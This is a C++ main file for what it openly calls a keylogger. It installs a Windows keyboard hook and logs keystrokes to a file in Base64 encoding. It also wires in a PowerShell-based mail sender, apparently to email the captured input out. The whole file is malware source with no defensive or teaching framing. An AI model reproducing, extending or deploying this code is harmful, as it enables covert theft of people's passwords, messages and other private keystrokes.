#include "Base64Encryptor.h"
#include "DefaultFileSystemAccess.h"
#include "KeyboardHook.h"
#include "PowerShellMailSender.h"

int main()
{
    MSG message;

    using namespace keylogger;
    using namespace keylogger::mail;

    std::shared_ptr<FileSystemAccess> fileSystem = std::make_shared<keylogger::DefaultFileSystemAccess>();
    std::unique_ptr<MailSender> mailSender =
        std::make_unique<PowerShellMailSender>(std::make_unique<PowerShellSendMailScriptCreator>(fileSystem));
    KeyboardHook hook{std::move(mailSender),
                      std::make_unique<UserInputFileLogger>(fileSystem, std::make_unique<Base64Encryptor>())};

    hook.installHook();

    while (GetMessage(&message, nullptr, 0, 0))
    {
        TranslateMessage(&message);
        DispatchMessage(&message);
    }

    hook.uninstallHook();
    return 0;
}